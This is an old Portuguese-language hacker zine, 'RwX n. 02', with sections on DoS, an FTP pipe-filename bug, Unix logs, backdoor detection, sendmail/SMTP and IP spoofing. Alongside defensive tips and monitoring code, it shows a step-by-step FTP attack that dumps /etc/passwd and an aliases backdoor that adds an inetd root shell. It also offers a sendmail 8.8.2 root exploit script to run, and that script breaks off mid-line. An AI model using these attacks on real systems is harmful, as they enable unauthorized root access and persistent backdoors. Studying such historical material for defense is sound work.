@@ -1,0 +1,1427 @@
+.oO <Start> Oo.
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+:::::::""`````""::::::""`:.:`""::"`````"::'"```'.::::
+:::: .g#S$$$$$S#n  .g#S$$   $$S#n. $$$S#s s#S$$$ ::::
+:::: $$$$$$ $$$$$  $$$$$$ $ $$$$$$ .  $$$ $$$   .::::
+:::: $$$$$$g$$$$$. $$$$$$ $ $$$$$$ :'  $$g$$   .:::::
+:::: $$$$$$ $$$$$$ $$$$$$ $ $$$$$$ ' $$$$ $$$$  '::::
+:::: $$$$$$  $$$$$ $$$$$$.$.$$$$$$ $$$$$ . $$$$$ ::::
+:::: $S$$$$   $$$$ `S$$$$s s$$$$S'.`S$$  :  $$S'.::::
+::::.......:.....:::.............:::....:::....::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+----------------------------------------------------------------------------[rwx]-
+
+RWX n. 02
+http://www.necroterium.com.br/rwx - http://www.cyberspace.org/~rwx -
+http://www.cryogen.com/rwx (Redirecionamento)
+
+Email : rwx@cyberspace.org ou rwx@null.net
+
+----------------------------------------------------------------------------[rwx]-
+
++-------------------------------------------------------------------------+
+| Nao existe uma rede segura ; nem um computador seguro. O unico          |
+| computador seguro e' aquele que esta desconectado  da tomada , trancado |
+| em uma caixa forte , e a unica pessoa que conhecia a combinacao morreu  |
+| na semana passada                                                       |
++-------------------------------------------------------------------------+
+
+----------------------------------------------------------------------------[rwx]-
+
+INDICE
+~~~~~~
+
+01#. INTRODUCAO......................................................group
+02#. DENIAL OF SERVICE..............................................._KniGHT_
+03#. FTP BUG (AIX / Linux)...........................................Kbyte
+04#. LOG.............................................................Kbyte
+05#. DETECTANDO BACKDOORS............................................Skynet
+06#. SENDMAIL, SMTP..................................................Kbyte
+07#. IP SPOOF, NUKE, ETC.............................................Zaph0d
+08#. HACKEANDO UNIX SYSTEM PART II...................................Skynet
+09#. OOB TO FTP......................................................DmS
+10#. SPERL XPLOIT....................................................DmS
+11#. MAILS...........................................................group
+
+----------------------------------------------------------------------------[rwx]-
+
+01.INTRODUCAO
+=============
+Hello pessoal . Estamos agora com nossa 3 edicao da nossa zine
+e esperamos que esta agrade voce. Recebemos muitos elogios , parabens e
+esse tipo de coisa por email. Nos agradecemos a todos que nos escreveram e
+tambem quero pedir para quem entenda bem de um assunto possa mandar um
+email para nos como uma materia e ser ela for aprovada , sera publicada na
+proxima RwX. Essa Zine (02) conheceu uma demora , devido a um problema de
+hard de um de nossos integrantes e portanto decidimos ter nossa equipe
+toda a postos para entao poder publicar essa zine
+
+   Quero esclarecer uma coisa , nossa zine , nao eh voltada para o mau uso
+de nossas materias para hackers penetrarem em sistemas , mas o contrario ,
+nos expomos o lado comprometedor da seguranca e sempre as solucoes , pois
+nao queremos fazer so um manual de como proteger seu sistema mas sim que o
+admin entenda o problema e entao faca a correcao deste. Entao se voce faz
+mal uso dessas informacoes , quero que nos deixem fora disso , pois a
+responsabilidade sera interamente sua , pois nao podemos censurar para
+quem mandaremos a zine.
+
+   Se voce gostar , discordar ou detestar das materias aqui contidas , por
+favor , mande-nos email (rwx@cyberspace.org) para podermos saber e entao
+se preciso reformular a zine para atender nossos leitores :)
+
+   Essa zine eh distribuida livremente , e gratuitamente , nao podendo ser
+vendida , se por acaso , vc quiser usar algum informacao aqui contida em
+algum outro tipo de publicacao , por favor nos avise-nos e nos de
+credito.Agradecemos de antemao , e esperamos os emails de voces falando o
+que acharam da zine!
+
+RwX
+
+**************************************************************************
+            "Fixing Unix is easier than living with NT."
+                       --Larry McVoy
+**************************************************************************
+
+---------------------------------------------------------------------[rwx]-
+
+02.Denial of Service(Caseiro) by _KniGHT_
+=========================================
+killermaster@hotmail.com
+on-connect:root@cyberhack.dyn.ml.org
+
+  Oi, galera to de volta.. nesse mes irei falar sobre um assunto que nao
+ tem muito haver com seguranca, mas que e muito importante que e os 'Denial
+ of Service's' que dao uma dor de cabeca :). Um dia desses depois de uma se-
+ cao de 2h de internet o Pixel enxendo o saco :) (grande PiX) e a brasnerd
+ em NETexplOde de 10 a 10secs, comecei a ficar extressado apertei alt+f6, heh
+ unico terminal livre e digitei um ppp-off :) melhor coisa que eu fiz na minha
+ vida.. ai comecei a ficar lesando tipo. rodar um portscanner e fica na lese-
+ ira ate que resolvi da um finger @localhost & muitas vezes ,, THAN?? oque es-
+ ta acontecendo:
+
+ [localhost]
+ finger: connect: Connection refused
+
+  Heheh.. fiquei meio interessado no assunto.. :)  que maravilha . tipo
+ assim o programa nao conseguiu resolver os numeros de connecoes em espacos
+ de tempo pequeno e deve ter dado um core.
+
+  O mesmo acontece com as seguintes portas:
+
+    21(ftp)
+    25(stmp)
+    110(pop3d)
+
+  Eu testei na da telnet , e na porta 80(www) so que nenhuma caiu. ai voces
+ me perguntam ta i ai.. o que tem o cara killa minha porta 25,21,110 e ai to
+ muito preocupado.. hhheh fica pensando isso que seu provider vai perde usu-
+ ario :).. tipo se o cara killa a porta 25 niguem manda + e-mail durante uns
+ 10minutos(geralmente e o tempo, que a porta demora para voltar), e se o ca-
+ ra killa a 110(pop3d) niguem pode pegar seus E-MAIL'S, hehe da um pouco de
+ reiva. Ok!!! EU ensino a solucao.
+
+  Primeiro p/ que funcione o esquema o MALDITO FLOODER tem que ter um
+ connecao rapido com o provedor ou seja e + facil quando e user do provedor
+ mesmo. Segundo se a maquina do seu provedor e um PENTIUM 500 :) com 110<pra
+ cima de RAM nao se preocupe, + se nao procure aumentar a swap.
+
+  Pronto basicamente e Isso. p/ sanar este problema aumente a swap p/ uns
+ 130megas que eu acho que nao acontecera mais este problema.
+
+                Agora vou mandar o killpop3d em uuencode.
+
+Ps: O Arquivo vem junto com o zine, pois era muito longo para deixa-lo aqui.
+
+----------------------------------------------------------------------------[rwx]-
+
+03.Ftp Bug (AIX / Linux) by Kbyte
+=================================
+
+           Ola leitores da RwX..Este mes virei com uma informacao
+quentinha , acabada de ser descoberta..Um bug nos principals FTP daemons
+que se sabe ate agora que afeta Linux (SlackWare , Redhat) e AIX , mas
+outros sistemas ainda podem ser vulneraveis.
+
+          TEORIA
+  Esse bug no ftp , consiste no seguinte :
+  O Ftp cliente pode "enganar" o ftp daemon(server) puxando um arquivo que
+comeca com um pipe symbol( Pipe Symbol = | ) fazendo com o que o ftp
+daemon pense que o arquivo eh um shell script e executando o que contem
+nesse arquivo.
+
+          O ATAQUE
+       Voce , localmente , cria um arquivo chamado |sh no dir /home/ftp do
+provedor com o comando que vc quer que seja executado
+       Ex : echo "cat /etc/passwd >> /home/ftp/OUT" >> "|sh"
+  e entao voce entra no ftp (Pode ser anonymous) e executa um mget
+       Ex : mget *sh
+  e entao BUMM , ele tera o arquivo passwd no /home/ftp/OUT..
+      Vamos ao exemplos :
+
+[root@kbyte ftp]# pwd
+/home/ftp
+[root@kbyte ftp]# echo "id >> /home/ftp/OUT" >> "|sh"
+[root@kbyte ftp]# ls -lga *sh
+-rw-r--r--   1 root     root           20 Dec  3 21:19 |sh
+[root@kbyte ftp]# ftp localhost
+Connected to localhost.
+220 kbyte.org FTP server (Version wu-2.4.2-academ[BETA-11](1) Tue
+Sep 3 18:44:35 EDT 1996) ready.
+Name (localhost:root): anonymous
+331 Guest login ok, send your complete e-mail address as password.
+Password:
+230 Guest login ok, access restrictions apply.
+ftp> mget *sh
+mget |sh? y
+200 PORT command successful.
+150 Opening BINARY mode data connection for |sh (20 bytes).
+226 Transfer complete.
+20 bytes received in 0.2 secs (0.098 Kbytes/sec)
+ftp> ls OUT
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+-rw-r--r--   1 0        root         1869 Dec  3 23:22 OUT
+226 Transfer complete.
+ftp> get OUT
+local: OUT remote: OUT
+200 PORT command successful.
+150 Opening BINARY mode data connection for OUT (1869 bytes).
+226 Transfer complete.
+ftp> quit
+221 Goodbye.
+[root@kbyte ftp]# cat OUT
+uid=100(guest) gid=100(usr)
+[root@kbyte ftp]#
+
+Bem , ai ficou simples...
+Nesse exemplo , eu fiz um |sh localmente..Mas poderia fazer remotamente..
+Mas como o arquivo |sh possue um Pipe Symbol nao se pode simplesmente
+uploadar.Mas Se o server tiver um incoming com RWX para todos voce pode
+fazer um pequeno truque.
+
+Crie um arquivo qualquer , por exemplo , dummy_test_file.
+Mande esse arquivo pro Incoming do ftp em questao..
+Renomeie esse arquivo para |sh e depois mget *sh...
+
+SOLUCAO
+IBM = Retirar o Suid Bit do FTP.
+Linux = Ainda nao se tem uma solucao.Talvez nao ter Incoming.
+
+KByte
+kbyte@biogate.com
+
+----------------------------------------------------------------------------[rwx]-
+
+04.LOG by Kbyte
+===============
+
+        Olha aqui eu outra vez , desta vez pra falar sobre log.
+Se voce ja sabe sobre isso e achar o que eu falar aqui basico demais ,
+problema seu , a realidade e' que muitos admins (Nao e' que seja voce) ,
+mas muitos admins deste brasil so sabem acrescentar usuarios e depois ver
+as horas gastas pra poder cobrar , e acho isso errado , pois se depois
+algum 'hacker' penetrar no sistema , ele nao vai ter nem o que fazer ,
+pois mal sabe aonde fica os logs de seu sistema , entao essa materia e'
+para ajudar alguns e complementar para outros , e se voce quiser dar uma
+olhada so para avaliar , tambem aprecio.;)
+
+        Um arquivo de log pode ser muito importante para detectar pessoas
+indesejaveis no seu sistema , pois com ele vc pode saber a frequencia dos
+acessos do usuario ao seu sistema e ate erros cometidos por ele.
+        O recomendavel seja o que vc use o hosts.deny para criar um outro
+arquivo de log (O qual eu expliquei na materia sobre seguranca nessa zine)
+com as tentativas de acesso a sua maquina.
+        Por default , os *NIX tambem contem arquivos de logs , alguns
+especificos de programas , mas outros mais abrangentes como e' o caso do
+messages .
+
+        Esses arquivos em sua maioria podem ser encontrados no diretorio
+/var/log da sua maquina , e vamos falar sobre alguns deles
+
+ * messages - Esse arquivo loga quase tudo que acontece na sua maquina ,
+inclusive tentativa de conexoes de telnets ma-sucedidas .
+Por exemplo :
+Jul 31 17:06:42 kbyte login: FAILED LOGIN SESSION FROM
+(ppp1.provedor.com.br) FOR joao, User not known to the underlying
+authentication module
+      O que lhe informa que exatamente as 17:06 , do dia 31 de julho ,
+alguem com ip ppp1.provedor.com.br tentou telnetar pra sua maquina
+tentando usar o login joao.
+      Esse arquivo tambem pode conter algumas informacoes acidentais que
+podem comprometer o resto do sistema , como o caso dos usuarios digitarem
+sua senha no lugar do login , o que e' muito comum , ficando assim nesse
+arquivo a senha do usuario , e entao sendo importante esse arquivo so
+poder ser lido pelo root ou adm do sistema.
+
+* lastlog - Esse arquivo guarda informacoes sobre os ultimos acessos a
+maquina , voce pode checar a ultima vez que certo usuario logou , usando o
+comando lastlog , que lhe informa tambem o ip do usuario .
+
+* maillog - Esse arquivo contem informacoes do sendmail , erros , e alguns
+dados sobre emails mandados e recebidos dentro da maquina . E' importante
+tambem este arquivo ser Read somente para o root , pois privacidade e' bom
+tanto para voce , como para seus usuarios
+
+* secure - Esse arquivo guarda informacoes sobre as ultimas conexoes
+estabelicidas com sua maquina .
+Aug 24 17:29:12 kbyte in.telnetsnoopd[1934]: connect from ppp1.provedor.com.br
+Bem , esta linha e' obvia.:)
+
+   Estes dois arquivos a seguir , nao sao encontrados no /var/log mas sao
+muito importantes
+
+* UTMP - Guarda as informacoes dos usuarios logados no momento , usado
+pelo w , who , etc.
+
+* WTMP - Guarda todos os logins e logouts.
+
+Por favor , nao de uma de palhaco e deixe esses dois arquivos 'World
+Writable'
+
+      -----------------------------------------------------------
+
+       Voce deve estar perguntando , mas se o atacante apagar ou editar
+esses arquivos ?
+       Se voce acha que seu sistema ainda nao esta protegido , voce pode
+tornar seus logs inapagaveis remotamente . Como? Muito simples ,
+imprimindo-os ! Isso mesmo , eu ja vi esse modo funcionar em um provedor ,
+e garanto que melhor solucao nao ha.
+       Esse arquivos podem ser imprimidos manualmente mas eu sugiro voce
+colocar no seu crontab uma linha em que imprima as dez umas linhas dos
+arquivos de log a cada 10 minutos , por exemplo , rapido , facil , eficaz
+mas gastador de papel.Nesse caso e' a seguranca do seu site em jogo!;)
+Exemplo duma linha no /etc/crontab
+41 02 05,10,15,20,25 * * root cp /var/log/messages >> /dev/lp0
+
+       Devo imaginar que a essa altura , muitos ja devem ta rindo , mas
+estes sao provavelmente os que se autointitulam 'hackers' e que nao
+podemos evitar que essa revista chegue em suas maos.
+       Pois bem , mes que vem , neste mesmo Bat-Site , no mesmo
+Bat-Browser , mais uma RwX com novos tipos pros ircadmins espertos!;)
+
+De brinde mando um programinha em .c , que eu achei muito interessante ,
+vc roda ele em background e ele te avisa quando alguem entra ou sai da sua
+maquina , bastante util pra alguns ! Bom Divertimento .
+
+---------------------------------CORTE AQUI----------------------------------------
+
+/*
+        Marcus Ranum 1985
+        usage: spy &
+        the program will exit cleanly when you log out.
+*/
+#include <sys/types.h>
+#include <sys/file.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <ctype.h>
+#include <utmp.h>
+
+/*
+ * Defines to work around System V
+ * lameness.  sysvreallydoessux.
+ */
+
+#define bcopy(s1, s2, len) memcpy(s2, s1, len)
+#define index(s, c) strchr(s, c)
+#define rindex(s, c) strrchr(s, c)
+#define bzero(s, len) memset(s, 0, len)
+#define bcmp(s1, s2, len) (memcmp(s1, s2, len)!=0)
+#define WAITIME 5
+
+#define USIZ    (sizeof(struct utmp))
+
+extern  char    *malloc();
+extern  char    *realloc();
+extern  off_t   lseek();
+
+static  void
+szprint(s,max)
+char    *s;
+int     max;
+{
+        /* catch the bastard even if they put esc. codes in ! */
+        while(max-- && *s != '\0')
+                if(isprint(*s))
+                        (void)fprintf(stderr,"%c",*s++);
+                else
+                        (void)fprintf(stderr,"(0x%X)",*s++);
+}
+
+static  void
+notify(old,new)
+struct  utmp    *old;
+struct  utmp    *new;
+{
+char    *op;
+struct  utmp    *u;
+
+        u=new;
+        op="in";
+        if(new->ut_name[0] == '\0') {
+                u = old;
+                op = "out";
+        }
+
+        szprint(u->ut_name,sizeof(u->ut_name));
+        if(u->ut_line[0] != '\0') {
+                (void)fprintf(stderr,"@");
+                szprint(u->ut_line,sizeof(u->ut_line));
+        }
+        (void)fprintf(stderr," (");
+        szprint(u->ut_line,sizeof(u->ut_line));
+        (void)fprintf(stderr,") ( %DATE ) logged %s\n ",op);
+}
+
+main()
+{
+        time_t  m_time;
+        int     utfd;
+        struct  utmp    *up;
+        struct  utmp    ubuf;
+        int     upsiz;
+        struct  stat    sbuf;
+
+        if(stat(UTMP_FILE,&sbuf) != 0 || (utfd = open(UTMP_FILE,O_RDONLY)) < 0) {
+                perror(UTMP_FILE);
+                exit(1);
+        }
+        m_time = sbuf.st_mtime;
+
+        if((up = (struct utmp *)malloc((unsigned)sbuf.st_size)) == NULL) {
+                perror("malloc utmp buffer");
+                exit(1);
+        }
+        upsiz = sbuf.st_size;
+
+        if(read(utfd,(char *)up,(int)sbuf.st_size) != sbuf.st_size) {
+                (void)fprintf(stderr,"read %ld bytes from ",sbuf.st_size);
+                perror(UTMP_FILE);
+                exit(1);
+        }
+
+        while(1) {
+                if(getppid() == 1)
+                        exit(0);
+
+                (void)sleep(WAITIME);
+
+                if(stat(UTMP_FILE,&sbuf) < 0) {
+                        perror(UTMP_FILE);
+                        exit(1);
+                }
+
+                if(upsiz < sbuf.st_size) {
+                        up = (struct utmp *)realloc((char *)up,(unsigned)sbuf.st_size);
+                        if(up == NULL) {
+                                perror("realloc utmp buffer");
+                                exit(1);
+                        }
+                        upsiz = sbuf.st_size;
+                }
+
+                if(sbuf.st_mtime != m_time) {
+                        int     i;
+
+                        if(lseek(utfd,0L,0) != 0L)
+                                continue;
+
+                        for(i = 0; i < sbuf.st_size / USIZ; i++) {
+                                if(read(utfd,(char *)&ubuf,USIZ) != USIZ)
+                                        continue;
+                                if(bcmp((char *)&up[i],(char *)&ubuf,USIZ)) {
+                                        notify(&up[i],&ubuf);
+                                        (void)bcopy((char *)&ubuf,(char *)&up[i],USIZ);
+                                }
+                        }
+                        m_time = sbuf.st_mtime;
+                }
+        }
+}
+
+---------------------------------CORTE AQUI----------------------------------------
+
+----------------------------------------------------------------------------[rwx]-
+
+  05.DETECTANDO BACKDOORS by Skynet
+  =================================
+
+  Hi D00dz,
+
+  Introducao
+  ==========
+  Nessa materia pretendo fazer um complemeto da materia do Knight na
+  edicao passada sobre backdoors.A dica sera para usuarios com nivel
+  medio de conhecimento em Unix. Caso vc nao se enquadre no que falei,
+  e' melhor estudar mais  um  pouquinho o assunto,ou ate mesmo da um
+  tempo pro Bill Gates(Microsoft Suckz!), que nao para de comer  seu
+  dinheiro e seu cerebro ;-P . Serei breve e claro.
+
+  Um Backdoor e' sem duvida umas das melhores maneiras de se garantir o
+  acesso permanente a uma maquina "hackeada",pois so depende exclusivamente
+  de uma coisa: O daemon inetd! O arquivo de configuracao desse daemon se
+  encontra em /etc/inetd.conf e possui uma certa quantidade de linhas,
+  portanto fica um pouco trabalhoso  o  admin  ter que verificar linha
+  por linha ate detectar o backdoor,isso se ele se lembrar de fazer-lo.
+  Ainda temos que levar em conta que existem backdoors temporarios, que
+  sao 'programados' como eventos crontabs, ou seja,so 'acordam' certa hora
+  (geralmente  de  madrugada), ocultando-se em seguida. Pra maiores
+  detalhes ver materia escrita pelo Auth na edicao rwx00.
+
+  Desenvolvi um pequeno programinha em C que detecta de maneira quaze
+  infalivel qualquer backdoor desse tipo que venham a ser acrescentado no
+  sistema. O motivo por ter escrito tal programa em C para dificultar que
+  algum 'fucador' saiba de cara do que se trata o programa. Certamente um
+  arquivo binario nao pode ser lido como um script do shell.
+
+  O PLANO
+  =======
+  Bom, nosso plano e muito simples. Ele consiste em fazer 1 copia de
+  seguranca tanto do arquivo inetd.conf quanto do crontab do root. Essa
+  copia devera ficar num diretorio "secreto" do sistema, onde SOMENTE
+  VOCE, devera saber!
+
+  Criando as copias:
+
+ cyberdine:~# cp /etc/inetd.conf /usr/bin/inetd.ok
+ cyberdine:~# cp /usr/spool/cron/crontabs/root /usr/bin/cronroot.ok
+
+OBS: Vale ressaltar, que com a grande variedade de sistemas compativeis
+===  com o Unix, alguns desse diretorios podem nao ser iguais aos
+     apresentados aqui. Como usuario de seu sistema, creio que vc deva
+     conhecer bem onde ficam os diretorios especificos. Nao vou perder
+     tempo nem preciosos "bytes" colocando dezenas de diretorios pra cada
+     sistema! Isso eh problema seu...
+
+ ok, dewd...
+
+agora e' a vez do programa..
+
+cyberdine:~# cc -o seachdoor seachdoor.c
+cyberdine:~# cp seachdoor /usr/local/bin
+
+Neat!
+Nosso objetivo e fazer com que o root seja notificado sempre houver QUALQUER
+alteracao num desses dois arquivos, ele listara as linhas que foram alteradas
+pelo "hacker"  hehehe...
+
+cyberdine:~# echo /usr/local/bin/seachdoor >>~/.bash_profile
+
+-------------------------------CORTE AQUI--------------------------------
+/* NOME  : seachdoor.c
+ FUNCAO: Detecta Backdoors do tipo crontab/inetd
+ By Skynet 11/09/97*/
+
+#include <stdio.h>
+#define CRONTAB "/usr/bin/cronroot.ok"  /*define os caminhos do crontab*/
+#define INET_PATH "/usr/bin/inetd.ok"   /* idem pra inetd.conf*/
+main()
+{
+  system("clear");
+  system ("diff /etc/inetd.conf "INET_PATH"" );
+  system ("diff /usr/spool/cron/crontabs/root "CRONTAB"" );
+  printf ("\n done!");
+
+}
+------------------------------CORTE AQUI------------------------------
+
+  Mas como nem tudo  e' perfeito, um invasor atento provavelmente iria
+  sacar esse comando no seu .bash_profile, ai ele riria da sua  cara,
+  menosprezando e fazendo vc de idiota. Mas, ai vc e mais esperto do que
+  ele e aplicaria o mesmo raciocinio, apenas voltado pra outro lado,mais
+  dificil de ser descoberto. Desta vez  faremos  uma  copia  de  seguranca
+  do proprio .bash_profile atraves do arquivo de inicializacao do sistema
+  de forma que este  sempre  seja  "renovado"  quando   a  maquina   for
+  reinicializada  e  entao o backdoor sera detectado! ;-)
+
+  cyberdine:~# cp .bash_profile /boot/.profsecret
+  cyberdine:~# echo cp /boot/.profsecret ~/.bash_profile >>/etc/rc.d/rc.S
+
+  OBS: Escolha o diretorio que vc desejar, quanto menos importante ele for
+  ===  e mais arquivos tiver, melhor ainda.
+
+  Esse segundo passo sera mais dificil de ser descoberto, os arquivos de
+  inicializacao do sistema(rc's) geralmente nao  sao muito observados
+  pelos hackers, sao muitos(cerca de 13 no linux) e contem muitas linhas.
+  Eh de fundamental importancia que  vc remova o arquivo .bash_history no
+  seu HOME evitando que sigam os  seus passos. Aconselho a vc criar um
+  .bash_logout contendo uma linha "rm ~/.bash.history".
+
+  Quero logo deixar claro que tudo isso  isso nao e motivo pra vc ficar se
+  garantindo por ai e dizendo: "Meu sistema esta protegido de backdoors"
+  bah! Ao longo desses anos  aprendi  que a unica  maneira  de se ter
+  uma maquina 100% segura eh quando esta faltando energia!. Entendeu,dewd?:-)
+
+/ //////////////////////////////////////
+/    Cya                               /
+/..:.Skynet Undergrounds 1997.:..      /
+////////////////////////////////////////
+
+----------------------------------------------------------------------------[rwx]-
+
+06.SENDMAIL, SMTP by Kbyte
+==========================
+
+Bem , pessoal , depois de observar uma certa ignorancia por parte de
+usuarios e admins quanto ao SendMail e ao SMTP
+
+      O sendmail eh um daemon baseado em UNIX que roteia a correspondecia
+eletronica de usuario para usuario e de servidor para servidor.O sendmail
+eh dificil de usar e aborrceido para aprender . Como consequencia , varios
+aplicativos de terceiros tem sido desenvolvidos para atuar como interfaces
+deles. Os usuarios podem ser isolados dos comandos ocultos por tais
+interfaces de correio eletronico , como o 'ELM' , enquanto o sendmail ta
+la rodando em 2o plano satisfazendo a todos.
+
+     OPCOES
+***************
+     Um dos componentes mais confusos do sendmail eh sua varias opcoes.Eh
+seguro dizer que a grande maioria dessas opcoes nao eh usada regularmente.
+A razao para a abundancia de opcoes eh que o sendmail foi planejado para
+ser customizavel a quase qualquer necessidade.
+
+     - sendmail -bt e sendmail -bv = Usados quando o arquivo de
+configuracao eh alterado.
+     - sendmail -d# = defini nivel de depuracao
+     - sendmail -q<tempo> = define a frequencia para processar a fila de
+mensagens
+     - sendmail -bd = para definir o programa que rode em segundo plano
+     - sendmail =v  = defini o modo verbose para teste basico
+
+O programa de sendmail deve ser iniciado em background por algum script de
+inicializacao (/etc/rc.d)
+        path/to/sendmail -bd -q30
+            Seria uma sintaxe basica. Iniciando o sendmaik em segundo
+plano e o leva a processar mensagens a cada 30 minutos.
+
+Arquivos de Configuracao
+************************
+
+      Por o sendmail ser muito complexo nao irei explicar o sendmail.cf
+por este ser muito complexo e muito longo para ser comentado. Alem disso
+um usuario normal nao precisara saber muito sobre o sendmail.cf
+
+*  Alias - o arquivo aliases , normalmente /etc/aliases , e' usado para
+criar 'caixas' de correio para as quais nao existe conta de usuarios. Voce
+pode direcionar o email dessa caixa para um outro email ou ate para um
+programa (Como o caso do listserv , padrao para a maioria das listas de
+discussao)
+
+   alias : username
+    |           |
+    |            \
+Nome da conta     \
+nao existente  Para onde deve ir o email , outro user ou entao outro email
+
+ O exemplo acima direciona tudo que vier para alias , para a caixa de
+username.
+
+      Uma caracteristica importante mais perigosa talvez, eh a capacidade
+de redirecionar a correspondencia paara um programa. Por exemplo :
+
+     listserv:  "|/usr/local/bin/listserv -l"
+
+      Esta linha enviaria o arquivo mail para o programa listserv .
+
+******   E' um grande risco incluir um alias que redirecione
+*NOTA*   a correspondecia a um programa. Um cavalo de troia ou virus
+******   pode ser facilmente introduzido no sistema.
+
+Abaixo mostramos um /etc/aliases padrao , para quem eh familiarizado com o
+sitema UNIX sabe que as linhas precedidas de # sao comentarios
+
+#
+#	@(#)aliases	8.2 (Berkeley) 3/5/94
+#
+#  Aliases in this file will NOT be expanded in the header from
+#  Mail, but WILL be visible over networks or from /bin/mail.
+#
+#	>>>>>>>>>>	The program "newaliases" must be run after
+#	>> NOTE >>	this file is updated for any changes to
+#	>>>>>>>>>>	show through to sendmail.
+#
+
+# Basic system aliases -- these MUST be present.
+MAILER-DAEMON:	postmaster
+postmaster:	joazinho
+
+# General redirections for pseudo accounts.
+bin:		root
+daemon:		root
+games:		root
+ingres:		root
+nobody:		root
+system:		root
+toor:		root
+uucp:		root
+
+# Well-known aliases.
+manager:	root
+dumper:		root
+operator:	root
+
+# trap decode to catch security attacks
+decode:		root
+
+# Person who should get root's mail
+root:		joaozinho
+# Anothers users
+mariazinha:     mariazinha@nasa.gov
+back:         "|/tmp/.back"
+
+---------END--------------END------------------END------------------
+
+   Como vc ve por este arquivo todo o email que iria pro root , ira pro
+joazinho , e todo o email que chegar pra mariazinha ira pro seu outro
+email , no caso , mariazinha@nasa.gov
+
+   No caso do back , seria um backdoor para alguem malicioso ativar algum
+backdoor na sua maquina.No caso , algum email que chegasse para back ,
+iria executar o /tmp/.back e se o /tmp/.back fosse +/- assim :
+
+echo "backdoor stream tcp nowait root /bin/sh /bin/sh -i" >> /etc/inetd.conf
+echo "backdoor 6969/tcp" >> /etc/services
+
+Seu sistema estaria com certeza comprometido. Bastaria alguem mandar um
+email para back@suamaquina , e adicionaria um backdoor no seu inetd , e
+quando a maquina fosse reinicializada ou o inetd reiniciado , o backdoor
+estaria ativo .
+
+------------------------------------------------------------------
+
+******
+*SMTP*
+******
+            O programa sendmail usa o SMTP para enviar correspondencia
+eletronica para usuarios em hosts remotos. O host que recebe deve estar
+executando o sendmail ou um outro programa (Como o QMAIL) ativo na porta
+25.As estapas seguintes ocorreriam
+
+local> telnet host.remoto 25
+
+1.) O host.remoto estabelece conexao nessa porta para o sendmail local
+
+2.) O local se identifica ao reconhecer a conexao.Em seguida o host.remoto
+se identifica
+
+3.) Depois o local define quem enviou a mensagem eletronica
+
+4.) depois o local define para quem deve ser a mensagem
+
+5.) Se recusar o sendmail host.remoto registra uma msg de erro na caixa de
+correio do usuario remetente.
+
+6.) Se um dos destinatarios for reconhecido , o local mandara a msg ,
+terminando-a com um ponto em uma linha e o host.remoto enviara a mensagem
+para a caixa de correio do usuario.
+
+Exemplo
+
+220 pei.pei Simple Mail Tranfer Service Ready
+HELO sua.maquina
+250 Welcome to pei.pei
+MAIL FROM : <root@sua.maquina>
+250 OK
+RCPT TO : <joazinho@qualquer.sistem>
+250 OK
+DATA
+354 Start mail input: end with <CRLF>.<CRLF>
+From: root@sua.maquina
+To : joazinho@qualquer.sistem
+Subj: Mensagem importante
+Po meu filho , kade akeles 10 reais que vc ainda nao me pagou?
+.
+250 OK
+
+QUIT
+221 pei.pei Service closing transmission channel
+
+Bem , espero que vc tenha entendindo , a outra coisa a se dizer , as
+mensagems do host.remoto voltando com 2.xx indicam Ok , mensagens voltando
+5.xx indica erro incorrigivel , tipo um erro de sintaxe.4.xx tb indica
+erro so que com uma condicao temporaria , tipo , nao tamo atendendo agora
+, volte depois.
+
+Abaixo vai um exploit pequeno para um sendmail bug , versao 8.8.2
+Apenas bote na shell , chmod +x arquivo , e execute-o
+Ele criara uma shell no /tmp com suid bit , entao basta executa-la para se
+tornar root
+
+#!/bin/sh
+#                                   Hi !
+#                This is exploit for sendmail smtpd bug
+#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
+#         This shell script does a root shell in /tmp directory.
+#          If you have any problems with it, drop me a letter.
+#                                Have fun !
+#
+#
+#                           ----------------------
+#               ---------------------------------------------
+#    -----------------   Dedicated to my beautiful lady   ------------------
+#               ---------------------------------------------
+#                           ----------------------
+#
+#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su
+#
+#
+#
+echo   'main()                                                '>>leshka.c
+echo   '{                                                     '>>leshka.c
+echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
+echo   '}                                                     '>>leshka.c
+#
+#
+echo   'main()                                                '>>smtpd.c
+echo   '{
+
+----------------------------------------------------------------------------[rwx]-
+
+07. IP Spoof, NUKE e Sacanages na Internet
+Click (SPing), WinNuke, DrSpewfy, etc. by Zaph0d
+================================================
+
+Hi D00dZ,
+
+1) Consideracoes Iniciais:
+
+Queria primeiramente pedir desculpas por ter me afastado da edicao 01 da RWX
+(rwx01), mas infelizmente estava alem de com problemas pessoais serios, tinha
+tbem q trabalhar, afinal, nao to com a vida ganha ainda, hehe!!:P E como vcs
+devem imaginar, trabalho eh trabalho, e sempre tem um chefe chato cobrando teu
+relatorio de 50 paginas!! :PP Bem, deixando de bobagens, vamos ao q interessa
+(prometo escrever em dobro nessa edicao, pra compensar a outra perdida):
+
+Iremos falar sobre, e procurar entender o funcionamento do IP Spoof,
+Click, NUKE, e outras sacanagenzinhas q se faz pela Internet afora. Nao
+vou entrar em detalhes sobre COMO Spoofar uma conexao, deixemos isso mais
+pra frente se houver espaco e for do vosso interesse.
+
+2) IP Spoof - Funcionamento e Detalhes Sobre Conexoes
+
+a) Conexoes e Campos
+
+Nao sei se a maioria de vcs sabem, mas toda conexao baseada em protocolo
+IP, seja ela TCP ou UDP possui 2 campos, IP e PORTA, no formato IP:PORTA
+
+Como para uma conexao ser estabelecida precisamos de ORIGEM e DESTINO
+(SOURCE e TARGET), teremos entao 4 campos numa conexao:
+
+IP_ORIGEM : PORTA_ORIGEM       &       IP_DESTINO : PORTA_DESTINO
+
+Ex.: Para conectar-se num servidor de WWW o destino seria chamado assim:
+
+www.provedor.com.br:80
+
+Obs. 80 eh a porta padrao para servidores WWW
+
+No caso da origem (cliente) teriamos o campo definido assim:
+
+200.249.254.25 : 1000-4000
+
+Onde o IP acima eh apenas uma suposicao do IP do usuario, e 1000-4000 eh
+uma faixa de portas locais, q podem estar desde 1000 ateh 4000. Aih q
+comecamos a desvendar o funcionamento do Spoof/Click/NUKE. Entendendo o q
+escrevi acima, vcs terao meio caminho andando para entender com
+profundidade como funciona essas coisinhas SEBOSAS q falei acima. >:))
+
